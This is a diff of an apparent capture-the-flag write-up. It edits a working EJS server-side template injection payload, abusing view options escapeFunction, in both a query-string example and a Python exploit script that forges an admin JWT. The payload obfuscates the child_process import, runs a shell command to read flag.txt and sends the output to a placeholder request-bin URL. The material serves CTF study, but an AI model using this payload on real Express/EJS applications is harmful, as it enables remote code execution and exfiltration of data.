@@ -937,7 +937,7 @@ app.get(
 in source code, it render with `res.status(404).render("error", req.query);` if no user matches.
 trigger rce with ejs vulnerability.
 ```javascript
-settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}});})&settings[view options][client]=1&settings[view options][debug]=1
+settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => \x7b\x7bvar a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});\x7d\x7d);})&settings[view options][client]=1&settings[view options][debug]=1
 ```
 
 ```javascript
@@ -985,7 +985,7 @@ admin_jwt = jwt.encode(admin_origin, password, algorithm="HS256")
 s.cookies.clear()
 s.cookies.set("token", admin_jwt)
 
-payload = "settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}});})&settings[view options][client]=1&settings[view options][debug]=1"
+payload = "settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => \x7b\x7bvar a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});\x7d\x7d);})&settings[view options][client]=1&settings[view options][debug]=1"
 rce = s.get("http://localhost:3000/user-details/admin1?" + payload)
 ```
 
